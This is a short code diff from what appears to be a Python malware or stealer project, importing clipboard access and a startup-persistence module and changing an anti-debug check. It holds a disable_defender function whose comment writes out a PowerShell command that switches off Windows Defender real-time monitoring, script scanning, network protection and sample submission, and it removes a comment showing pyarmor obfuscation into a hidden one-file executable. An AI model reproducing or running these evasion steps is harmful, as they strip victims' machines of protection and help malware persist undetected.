@@ -14,12 +14,9 @@ from pyperclip import paste
 from modules.startup import Startup
 
 
-#
-#pyarmor pack -e " --onefile -w -i icon.ico --clean --upx-dir C:/UPX" main.py
-#
-
 if ANTIDEBUG:
-    Antidebug()
+    try: Antidebug
+    except: pass
 
 def disable_defender():
     #C:\> Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend && Set-MpPreference -SubmitSamplesConsent 2
